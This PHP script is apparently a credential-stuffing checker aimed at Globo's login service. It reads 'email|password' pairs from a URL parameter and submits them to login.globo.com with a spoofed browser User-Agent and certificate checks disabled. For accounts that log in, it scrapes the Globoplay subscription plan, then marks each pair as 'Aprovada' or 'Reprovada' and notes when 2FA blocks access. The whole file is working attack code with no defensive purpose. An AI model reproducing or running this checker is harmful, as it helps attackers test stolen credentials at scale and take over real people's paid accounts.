<?php
clear();
error_reporting(0);

$linhas = $_GET['linhas'];
$separar = explode("|", $linhas);
$email = $separar[0];
$senha = $separar[1];

function extrair($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}

function clear(){
  if(file_exists('cookies.txt')){
    @unlink('cookies.txt');
  }
}

$ch = curl_init();
curl_setopt_array($ch, array(
	CURLOPT_URL => 'https://login.globo.com/api/authentication',
	CURLOPT_RETURNTRANSFER => 1,
	CURLOPT_FOLLOWLOCATION => 1,
	CURLOPT_SSL_VERIFYPEER => 0,
	CURLOPT_SSL_VERIFYHOST => 0,
	CURLOPT_HTTPHEADER => array(
		'Content-type: application/json; charset=UTF-8',
		'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
		'Pragma: no-cache',
		'Accept: application/json, text/javascript',
		'origin: https://login.globo.com',
		'referer: https://login.globo.com/login/4654?url=https://globoplay.globo.com/&tam=WIDGET',
		'accept-encoding: gzip, deflate, br',
		'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
	),
	CURLOPT_COOKIEJAR => getcwd().'/cookies.txt',
	CURLOPT_COOKIEFILE => getcwd().'/cookies.txt',
	CURLOPT_POSTFIELDS => '{"payload":{"email":"'.$email.'","password":"'.$senha.'","serviceId":4728},"captcha":""}',
	CURLOPT_CUSTOMREQUEST => 'POST',
	CURLOPT_ENCODING => 'gzip, deflate, br'
));
$login = curl_exec($ch);

if(strpos($login, '"Usuário autenticado com sucesso"') !== false){

	$ch = curl_init();
	curl_setopt_array($ch, array(
		CURLOPT_URL => 'https://centralisp.globo.com/Central-ISP/autenticarUsuario.action?empresa=1',
		CURLOPT_RETURNTRANSFER => 1,
		CURLOPT_FOLLOWLOCATION => 1,
		CURLOPT_SSL_VERIFYPEER => 0,
		CURLOPT_SSL_VERIFYHOST => 0,
		CURLOPT_HTTPHEADER => array(
			'Content-type: application/x-www-form-urlencoded',
			'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
			'Pragma: no-cache'
		),
		CURLOPT_COOKIEJAR => getcwd().'/cookies.txt',
		CURLOPT_COOKIEFILE => getcwd().'/cookies.txt',
		CURLOPT_CUSTOMREQUEST => 'GET',
	));
	$assinaturas = curl_exec($ch);

	if(strpos($assinaturas, '<h1>Assinaturas</h1>') !== false){

		if(strpos($assinaturas, 'titulo-plano') !== false){

			$capture = extrair($assinaturas, 'class="titulo-plano">', '</p>');

			echo "#Aprovada $linhas | Assinaturas: $capture + 1.";

		}else{

			echo "#Aprovada $linhas | Assinaturas: Não Encotradas.";

		}

	}else{

		echo "#Reprovada $linhas | Conta Sem Assinaturas.";

	}

}elseif (strpos($login, '{"id":"BadCredentials","userMessage":"Seu e-mail ou senha estão incorretos."}') !== false) {

	echo "#Reprovada $linhas | e-mail ou senha estão incorretos.";

}elseif (strpos($login, 'PendingActivation') !== false) {

	echo "#Reprovada $linhas | 2FA ATIVO!.";

}elseif (strpos($login, 'Por favor, preencha seu e-mail e senha') !== false) {

	echo "#Reprovada $linhas | e-mail ou senha estão incorretos.";

}elseif (strpos($login, 'Seu acesso não foi autorizado para este conteúdo') !== false) {

	echo "#Reprovada $linhas | e-mail ou senha estão incorretos.";

}else {

	echo "#Reprovada $linhas | Error Desconhecido.";

}

curl_close($ch);
?>